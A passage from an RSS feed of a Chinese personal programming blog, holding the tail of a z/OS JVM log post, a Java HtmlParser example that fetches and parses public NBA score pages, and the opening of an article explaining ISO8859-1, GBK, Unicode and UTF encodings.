reserved.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>java version "1.4.2"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>Java(TM) 2 Runtime Environment, Standard Edition (build 1.4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>Classic VM (build 1.4.2, J2RE 1.4.2 IBM z/OS Persistent Reusable VM build cm142i<BR>JVMJZBL1015N MVS commands are DISABLED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>JVMJZBL1023N Invoking lib.WebServer.main()...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>  <P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007112711214993/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java解析网页HtmlParser]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720067798110/</link>
      <description>
<![CDATA[天气:<IMG title="Java解析网页HtmlParser - hankjin - 云水居"  alt="Java解析网页HtmlParser - hankjin - 云水居"  src="http://img.blog.163.com/photo/bOzunJnM668KHCP8wFpfGQ==/4278982595955566812.gif"  >心情:<IMG title="Java解析网页HtmlParser - hankjin - 云水居"  alt="Java解析网页HtmlParser - hankjin - 云水居"  src="http://img.blog.163.com/photo/qmcxKxMQX+esO4QSENBHeQ==/5131851775388843392.gif"  ><BR>  <P><SPAN>import org.htmlparser.Node;<BR>import org.htmlparser.NodeFilter;<BR>import org.htmlparser.Parser;<BR>import org.htmlparser.filters.TagNameFilter;<BR>import org.htmlparser.tags.TableTag;<BR>import org.htmlparser.util.NodeList;</SPAN></P>  <P><SPAN>/**<BR>&nbsp;* &lt;br&gt;<BR>&nbsp;* 标题: &lt;br&gt;<BR>&nbsp;* 功能概要: &lt;br&gt;<BR>&nbsp;* 版权: cityyouth.cn (c) 2005 &lt;br&gt;<BR>&nbsp;* 公司:上海城市青年网 &lt;br&gt;<BR>&nbsp;* 创建时间:2005-12-21 &lt;br&gt;<BR>&nbsp;* 修改时间: &lt;br&gt;<BR>&nbsp;* 修改原因：<BR>&nbsp;* <BR>&nbsp;* @author 张伟<BR>&nbsp;* @version 1.0<BR>&nbsp;*/<BR>public class HtmlParserTest <BR>{<BR>&nbsp;public static void testHtml() <BR>&nbsp;{<BR>&nbsp;&nbsp;try <BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;String sCurrentLine;<BR>&nbsp;&nbsp;&nbsp;String sTotalString;<BR>&nbsp;&nbsp;&nbsp;sCurrentLine = "";<BR>&nbsp;&nbsp;&nbsp;sTotalString = "";<BR>&nbsp;&nbsp;&nbsp;java.io.InputStream l_urlStream;<BR>&nbsp;&nbsp;&nbsp;java.net.URL l_url = new java.net.URL("<A rel="nofollow" href="http://sports.sina.com.cn/iframe/nba/live/"  >http://sports.sina.com.cn/iframe/nba/live/</A>");<BR>&nbsp;&nbsp;&nbsp;java.net.HttpURLConnection l_connection = (java.net.HttpURLConnection) l_url.openConnection();<BR>&nbsp;&nbsp;&nbsp;l_connection.connect();<BR>&nbsp;&nbsp;&nbsp;l_urlStream = l_connection.getInputStream();<BR>&nbsp;&nbsp;&nbsp;java.io.BufferedReader l_reader = new java.io.BufferedReader(new java.io.InputStreamReader(l_urlStream));<BR>&nbsp;&nbsp;&nbsp;while ((sCurrentLine = l_reader.readLine()) != null) <BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;sTotalString += sCurrentLine;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;System.out.println(sTotalString);<BR>&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;System.out.println("====================");<BR>&nbsp;&nbsp;&nbsp;String testText = extractText(sTotalString);<BR>&nbsp;&nbsp;&nbsp;System.out.println(testText);<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;catch (Exception e) <BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;e.printStackTrace();<BR>&nbsp;&nbsp;}<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp;* 抽取纯文本信息<BR>&nbsp;* <BR>&nbsp;* @param inputHtml<BR>&nbsp;* @return<BR>&nbsp;*/<BR>&nbsp;public static String extractText(String inputHtml) throws Exception <BR>&nbsp;{<BR>&nbsp;&nbsp;StringBuffer text = new StringBuffer();<BR>&nbsp;&nbsp;Parser parser = Parser.createParser(new String(inputHtml.getBytes(),"8859_1"), "8859-1");<BR>&nbsp;&nbsp;// 遍历所有的节点<BR>&nbsp;&nbsp;NodeList nodes = parser.extractAllNodesThatMatch(new NodeFilter() {<BR>&nbsp;&nbsp;&nbsp;public boolean accept(Node node) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;return true;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;});<BR>&nbsp;&nbsp;Node node = nodes.elementAt(0);<BR>&nbsp;&nbsp;text.append(new String(node.toPlainTextString().getBytes("8859_1")));<BR>&nbsp;&nbsp;return text.toString();<BR>&nbsp;}<BR>&nbsp;/**<BR>&nbsp;&nbsp;&nbsp;&nbsp; * 读取文件的方式来分析内容. filePath也可以是一个Url.<BR>&nbsp;&nbsp;&nbsp;&nbsp; * <BR>&nbsp;&nbsp;&nbsp;&nbsp; * @param resource<BR>&nbsp;&nbsp;&nbsp;&nbsp; *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件/Url<BR>&nbsp;&nbsp;&nbsp;&nbsp; */<BR>&nbsp;&nbsp;&nbsp; public static void test5(String resource) throws Exception {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Parser myParser = new Parser(resource);</SPAN></P>  <P><SPAN>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 设置编码<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; myParser.setEncoding("GBK");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String filterStr = "table";<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NodeFilter filter = new TagNameFilter(filterStr);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NodeList nodeList = myParser.extractAllNodesThatMatch(filter);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TableTag tabletag = (TableTag) nodeList.elementAt(11);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(tabletag.toHtml());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("==============");</SPAN></P>  <P><SPAN>&nbsp;&nbsp;&nbsp; }</SPAN></P>  <P><SPAN>&nbsp;&nbsp;&nbsp; /*<BR>&nbsp;&nbsp;&nbsp;&nbsp; * public static void main(String[] args) { TestYahoo testYahoo = new<BR>&nbsp;&nbsp;&nbsp;&nbsp; * TestYahoo(); testYahoo.testHtml(); }<BR>&nbsp;&nbsp;&nbsp;&nbsp; */<BR>&nbsp;&nbsp;&nbsp; public static void main(String[] args) throws Exception {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; test5("<A rel="nofollow" href="http://sports.yahoo.com/nba/scoreboard"  >http://sports.yahoo.com/nba/scoreboard</A>");<BR>&nbsp;&nbsp;&nbsp; }<BR>}</SPAN></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720067798110/</guid>
    </item>
    <item>
      <title>
<![CDATA[很经典的编码文章]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832224617161/</link>
      <description>
<![CDATA[<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">1. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">概述</SPAN><FONT face="Times New Roman"> </FONT></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　本文主要包括以下几个方面：编码基本知识，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，系统软件，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">url</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，工具软件等。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　在下面的描述中，将以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字为例，经查表可以知道其</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GB2312</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"d6d0 cec4"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">Unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"4e2d 6587"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码就是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"e4b8ad e69687"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。注意，这两个字没有</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，但可以用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码来</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">表示</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">2. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码基本知识</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　最早的编码是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">ascii</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码相似。但为了方便表示各种各样的语言，逐渐出现了很多标准编码，重要的有如下几个。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">2.1. iso8859-1</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　属于单字节编码，最多能表示的字符范围是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">0-255</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，应用于英文系列。比如，字母</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">a</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的编码为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">0x61=97</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　很明显，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码表示的字符范围很窄，无法表示中文字符。但是，由于是单字节编码，和计算机最基础的表示单位一致，所以很多时候，仍旧使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码来表示。而且在很多协议上，默认使用该编码。比如，虽然</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字不存在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gb2312</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码为例，应该是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"d6d0 cec4"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个字符，使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码的时候则将它拆开为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字节来表示：</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"d6 d0 ce c4"(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">事实上，在进行存储的时候，也是以字节为单位处理的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。而如果是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，则是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">6</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字节</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"e4 b8 ad e6 96 87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。很明显，这种表示方法还需要以另一种编码为基础。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">2.2. GB2312/GBK</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　这就是汉子的国标码，专门用来表示汉字，是双字节编码，而英文字母和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">一致</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">兼容</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。其中</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码能够用来同时表示繁体字和简体字，而</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gb2312</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">只能表示简体字，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">是兼容</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gb2312</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码的。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">2.3. unicode</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　这是最统一的编码，可以用来表示所有语言的字符，而且是定长双字节</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">也有四字节的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，包括英文字母在内。所以可以说它是不兼容</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码的，也不兼容任何编码。不过，相对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码来说，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">uniocode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码只是在前面增加了一个</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">0</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">字节，比如字母</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">a</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"00 61"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　需要说明的是，定长编码便于计算机处理</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">注意</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GB2312/GBK</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">不是定长编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，而</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">又可以用来表示所有字符，所以在很多软件内部是使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码来处理的，比如</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">2.4. UTF</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　考虑到</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码不兼容</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，而且容易占用更多的空间：因为对于英文字母，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">也需要两个字节来表示。所以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">不便于传输和存储。因此而产生了</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码兼容</SPAN><SPAN lang=EN-US><FONT face="Times New 